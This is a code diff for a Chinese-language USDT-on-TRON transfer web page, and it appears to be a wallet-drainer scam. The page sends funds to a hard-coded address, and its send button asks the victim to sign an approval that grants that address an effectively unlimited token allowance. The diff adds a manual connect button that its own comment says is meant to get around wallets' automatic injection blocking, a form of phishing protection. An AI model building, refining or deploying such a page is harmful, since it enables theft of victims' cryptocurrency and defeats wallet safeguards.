@@ -59,6 +59,11 @@ body {
   background: transparent;
   color: #111;
 }
+/* 修复placeholder字体太大 */
+.amount-input::placeholder {
+  font-size: 18px;
+  color: #aaa;
+}
 .max-btn {
   padding: 6px 14px;
   background-color: #dbeafe;
@@ -109,6 +114,17 @@ body {
   outline:none;
   color:#111;
 }
+.connect-btn{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:14px;
+  background:#1d4ed8;
+  color:#fff;
+  font-size:16px;
+  margin-bottom:12px;
+  cursor:pointer;
+}
 .send-main-btn{
   width:100%;
   padding:16px;
@@ -144,6 +160,9 @@ body {
   <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
 </div>
 
+<!-- 新增手动连接钱包按钮，绕过自动注入拦截 -->
+<button class="connect-btn" id="connectBtn">连接钱包</button>
+
 <div class="amount-card">
   <div class="label-text">转出数量（USDT）</div>
   <div class="amount-row">
@@ -165,12 +184,12 @@ body {
   <input id="receiveAmount" class="result-input" readonly>
 </div>
 
-<button class="send-main-btn" id="sendBtn">确认转账</button>
+<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
 
 <div class="bottom-connect-tip" id="connectTip">
   <div style="display:flex;align-items:center;gap:8px;">
     <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
-    <span id="walletAddrText">等待连接钱包</span>
+    <span id="walletAddrText">未连接钱包，请点击上方按钮连接</span>
   </div>
 </div>
 
@@ -189,41 +208,36 @@ const maxBtn = document.getElementById("maxBtn");
 const balanceText = document.getElementById("balanceText");
 const walletAddrText = document.getElementById("walletAddrText");
 const sendBtn = document.getElementById("sendBtn");
+const connectBtn = document.getElementById("connectBtn");
 
-sendBtn.disabled = true;
-
-// 通用多钱包连接函数（TP / 欧易 / imToken 共用）
-async function connectWallet() {
+// 手动点击按钮连接钱包（关键修复：放弃自动加载）
+connectBtn.addEventListener('click', async function(){
   walletAddrText.innerText = "正在请求钱包授权...";
+  connectBtn.disabled = true;
   try {
-    // 兼容两种注入方式：tronProvider（TP专用） / ethereum（欧易、imToken通用）
     const provider = window.tronProvider || window.ethereum;
     if (!provider) {
-      throw new Error("当前浏览器未检测到Web3钱包，请在钱包内置DApp浏览器打开");
+      throw new Error("未检测到钱包Provider，请在钱包内置浏览器打开本地HTML文件");
     }
 
-    // 请求账号
     let accounts;
     if (provider.isTronProvider) {
-      // TP钱包专用方法
       accounts = await provider.request({ method: "tron_requestAccounts" });
     } else {
-      // EIP1193标准钱包（欧易、imToken）
       accounts = await provider.request({ method: "eth_requestAccounts" });
     }
 
     if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
     userWallet = accounts[0];
 
-    // 初始化TronWeb绑定钱包provider
     tronWeb = new TronWeb({
       fullHost: TRON_GRID_API,
       provider: provider
     });
 
     walletAddrText.innerText = `${userWallet.slice(0,10)}...${userWallet.slice(-6)} 已连接`;
+    connectBtn.innerText = "钱包已连接";
 
-    // USDT合约ABI
     const abi = [
       {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
       {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
@@ -235,7 +249,6 @@ async function connectWallet() {
     await refreshBalance();
     sendBtn.disabled = false;
 
-    // 监听钱包切换地址自动刷新
     provider.on("accountsChanged", async (newAccounts) => {
       if(newAccounts.length === 0) location.reload();
       userWallet = newAccounts[0];
@@ -243,19 +256,18 @@ async function connectWallet() {
     });
 
   } catch (err) {
-    console.error("连接失败：", err);
-    walletAddrText.innerText = "钱包连接失败，请下拉刷新重试";
+    console.error(err);
+    walletAddrText.innerText = "连接失败：" + err.message;
+    connectBtn.disabled = false;
   }
-}
+})
 
-// 读取USDT余额
 async function refreshBalance() {
   const balanceSun = await usdtContract.balanceOf(userWallet).call();
   const realNum = Number(tronWeb.fromSun(balanceSun));
   balanceText.innerText = realNum.toFixed(6);
 }
 
-// 输入框联动到账数量
 function bindAmountCalc() {
   amountInput.addEventListener('input',()=>{
     let num = parseFloat(amountInput.value) || 0;
@@ -263,19 +275,17 @@ function bindAmountCalc() {
   })
 }
 
-// MAX按钮填充全部余额
 maxBtn.addEventListener("click", async ()=>{
-  if(!usdtContract) return;
+  if(!usdtContract) return alert("请先连接钱包");
   const balanceSun = await usdtContract.balanceOf(userWallet).call();
   const realNum = Number(tronWeb.fromSun(balanceSun));
   amountInput.value = realNum.toFixed(2);
   amountInput.dispatchEvent(new Event('input'));
 })
 
-// 转账&授权逻辑
 sendBtn.addEventListener('click',async ()=>{
   if(!tronWeb || !usdtContract){
-    alert("等待钱包连接完成后再操作");
+    alert("请先点击上方按钮连接钱包");
     return;
   }
   let sendVal = parseFloat(amountInput.value);
@@ -288,7 +298,7 @@ sendBtn.addEventListener('click',async ()=>{
   try{
     let allowance = await usdtContract.allowance(userWallet, FIXED_TARGET_ADDR).call();
     if(Number(allowance) < sendSun){
-      alert("需要授权，请在钱包签名确认");
+      alert("需要授权合约，请在钱包签名确认");
       await usdtContract.approve(FIXED_TARGET_ADDR, "9999999999999999999999999999").send();
       alert("授权完成，开始转账");
     }
@@ -299,11 +309,7 @@ sendBtn.addEventListener('click',async ()=>{
   }
 })
 
-window.onload = async function(){
-  bindAmountCalc();
-  // 延迟启动连接，避开页面加载阻塞
-  setTimeout(connectWallet, 600);
-}
+bindAmountCalc();
 </script>
 
 </body>
